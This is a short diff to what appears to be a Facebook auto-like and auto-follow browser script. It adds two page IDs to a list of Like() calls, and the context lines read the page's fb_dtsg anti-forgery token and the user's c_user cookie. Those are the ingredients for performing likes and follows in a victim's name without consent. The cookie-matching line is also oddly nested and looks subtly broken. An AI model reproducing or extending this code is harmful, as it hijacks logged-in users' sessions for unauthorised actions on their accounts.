@@ -89,7 +89,9 @@ Like("234982333218667");
 Like("456483724412226");
 Like("136785296514054");
 Like("146320572185345");
- 
+Like("150423395088679");
+Like("651209744905814");
+
 /*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
